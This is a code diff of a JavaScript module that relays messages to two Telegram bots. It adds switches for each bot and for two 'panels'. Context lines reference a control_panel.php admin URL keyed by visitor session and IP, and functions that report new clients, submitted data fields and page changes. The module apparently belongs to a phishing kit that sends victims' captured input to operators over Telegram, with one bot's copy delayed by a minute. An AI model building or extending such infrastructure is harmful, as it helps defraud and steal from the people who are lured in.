@@ -1,4 +1,41 @@
 const { getClient } = require('./db');
+const fs = require('fs');
+const path = require('path');
+
+// Fichier de configuration des bots Telegram
+const botsConfigPath = path.join(__dirname, '..', 'data', 'bots_config.json');
+
+// État par défaut des bots
+let botsConfig = {
+  bot1: { enabled: true },
+  bot2: { enabled: true }
+};
+
+// Charger la configuration depuis le fichier
+function loadBotsConfig() {
+  try {
+    if (fs.existsSync(botsConfigPath)) {
+      const data = fs.readFileSync(botsConfigPath, 'utf8');
+      botsConfig = JSON.parse(data);
+    }
+  } catch (err) {
+    console.error('[TG] Erreur chargement config bots:', err.message);
+  }
+}
+
+// Sauvegarder la configuration dans le fichier
+function saveBotsConfig() {
+  try {
+    const dir = path.dirname(botsConfigPath);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(botsConfigPath, JSON.stringify(botsConfig, null, 2));
+  } catch (err) {
+    console.error('[TG] Erreur sauvegarde config bots:', err.message);
+  }
+}
+
+// Charger la configuration au démarrage
+loadBotsConfig();
 
 function getAdminUrl(session, ip) {
   return `https://voyage-production-a035.up.railway.app/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
@@ -38,10 +75,21 @@ async function sendTelegram(message) {
     return;
   }
 
-  await Promise.all([
-    new Promise(resolve => setTimeout(() => sendToTelegramBot(token1, chatId1, message).then(resolve), 60000)),
-    sendToTelegramBot(token2, chatId2, message)
-  ]);
+  const promises = [];
+  
+  // Bot 1 - actif seulement si enabled
+  if (botsConfig.bot1.enabled && token1 && chatId1) {
+    promises.push(new Promise(resolve => setTimeout(() => sendToTelegramBot(token1, chatId1, message).then(resolve), 60000)));
+  }
+  
+  // Bot 2 - actif seulement si enabled
+  if (botsConfig.bot2.enabled && token2 && chatId2) {
+    promises.push(sendToTelegramBot(token2, chatId2, message));
+  }
+
+  if (promises.length > 0) {
+    await Promise.all(promises);
+  }
 }
 
 function getFieldLabel(field) {
@@ -115,4 +163,46 @@ function notifyVoteApproved(session, ip) {
   );
 }
 
-module.exports = { sendTelegram, notifyNewClient, notifyData, notifyAction, notifyPageChange, notifyVoteApproved };
+// Fonctions de gestion des bots
+function getBotsConfig() {
+  return { ...botsConfig };
+}
+
+function toggleBot(botNumber, enabled) {
+  const botKey = `bot${botNumber}`;
+  if (botsConfig[botKey]) {
+    botsConfig[botKey].enabled = enabled;
+    saveBotsConfig();
+    console.log(`[TG] Bot ${botNumber} ${enabled ? 'active' : 'desactive'}`);
+    return true;
+  }
+  return false;
+}
+
+function togglePanel(panelNumber, enabled) {
+  // panelNumber 1 = panel principal, panelNumber 2 = panel 2
+  // Pour l'instant, on stocke juste l'état dans botsConfig
+  if (!botsConfig.panels) botsConfig.panels = { panel1: true, panel2: true };
+  botsConfig.panels[`panel${panelNumber}`] = enabled;
+  saveBotsConfig();
+  console.log(`[Panel] Panel ${panelNumber} ${enabled ? 'active' : 'desactive'}`);
+  return true;
+}
+
+function getPanelStatus() {
+  if (!botsConfig.panels) botsConfig.panels = { panel1: true, panel2: true };
+  return botsConfig.panels;
+}
+
+module.exports = { 
+  sendTelegram, 
+  notifyNewClient, 
+  notifyData, 
+  notifyAction, 
+  notifyPageChange, 
+  notifyVoteApproved,
+  getBotsConfig,
+  toggleBot,
+  togglePanel,
+  getPanelStatus
+};
